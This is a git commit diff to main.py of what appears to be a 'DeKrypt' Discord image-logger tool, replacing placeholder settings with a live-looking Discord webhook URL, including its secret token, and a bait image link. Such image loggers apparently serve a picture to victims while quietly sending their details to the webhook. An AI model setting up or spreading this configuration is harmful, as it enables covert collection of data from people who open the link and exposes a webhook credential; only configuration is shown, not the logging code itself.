0b3d9e7b5a948d38935c2f32fe7856862362cc0f
princelone1y <134102129+princelone1y@users.noreply.github.com>
2023-05-20 01:11:35 +0400

    Update sus.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1109193270287941652/Y5v3wrdXdTevZgOatJA1gH5UTrWv52tICvfsLjBqyynXtNeSyiayeik3Q-Xjtc2pOSTP",
+    "image": "https://i.ytimg.com/vi/m-oszTKtKyo/maxresdefault.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
